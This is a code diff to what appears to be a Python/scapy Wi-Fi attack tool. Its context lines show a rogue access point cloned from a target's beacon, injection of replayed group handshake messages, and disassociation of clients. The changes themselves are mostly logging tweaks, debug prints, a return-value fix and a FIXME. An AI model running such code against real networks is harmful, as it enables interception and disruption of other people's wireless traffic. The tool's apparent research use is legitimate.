@@ -9,6 +9,8 @@ import os, sys
 from scapy.all import *  # noqa: E402
 from scapy.arch.linux import L2Socket, attach_filter
 from scapy.layers.dot11 import *
+from scapy.layers.eap import *
+
 
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -148,9 +150,15 @@ class ClientState():
     def add_if_new_msg3(self, msg3):
         added_nums = [get_eapol_replaynum(p) for p in self.msg3s]
         if get_eapol_replaynum(msg3) in added_nums:
-            log(WARNING, "Replay counter %d of msg3 is not new. Nums already we have: %s" % (get_eapol_replaynum(msg3),  ", ".join(map(str, added_nums))))
+            log(WARNING, "Replay counter %d of msg3 is not new. Nums already we have: %s" % (get_eapol_replaynum(msg3),  ", ".join(map(str, added_nums))), showtime=False)
             return
-        log(DEBUG, "Increased replay counter %d found at new msg3!" % (get_eapol_replaynum(msg3)))
+        if len(self.msg3s) == 0:
+            log(STATUS, "Initial msg3 with replay counter %d found" % (get_eapol_replaynum(msg3)), color="green",
+                    showtime=False)
+        else:
+            log(STATUS, "Increased replay counter %d found at new msg3!" % (get_eapol_replaynum(msg3)), color="green",
+                    showtime=False)
+
         self.msg3s.append(msg3)
 
     def update_state(self, state):
@@ -284,13 +292,15 @@ class Attack():
             if found_network not in found_networks:
                 found_networks.append(found_network)
                 log(DEBUG, "Found new network: <%s[%s]> at channel %d " % (found_network["ssid"], found_network["bssid"], found_network["channel"]))
+                print(current_chan, found_network["channel"], bssid, found_network["bssid"], ssid, found_network["ssid"])
                 if current_chan is not None and current_chan != found_network["channel"]:
                     return False
                 if bssid is not None and bssid != found_network["bssid"]:
                     return False
                 if ssid != found_network["ssid"]:
                     return False
-            return True
+                return True
+            return False
         
         if self.real_chan is not None and self.real_chan in range(1, 14):
             self.set_real_channel(self.real_chan)
@@ -712,6 +722,7 @@ class Attack():
             return
         # Parse beacon and used this to generate a cloned hostapd.conf
         self.mitm_ap = rogueAp.RogueAP()
+        print(self.beacon)
         if self.mitm_ap.set_config_mc_mitm(self.beacon) == False:
             return
         self.rogue_chan = self.mitm_ap.netconfig.channel
@@ -759,6 +770,7 @@ class Attack():
                 self.time_forward_group1 = None
                 log(STATUS, "Injected older group message 1: %s" % dot11_to_str(p), color="green")
 
+            # FIXME: Should I disassociate and reset the 4-way handshake more infrequently? Because of client timeout?
             while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
                 self.send_disas(self.disas_queue.pop()[1])
 
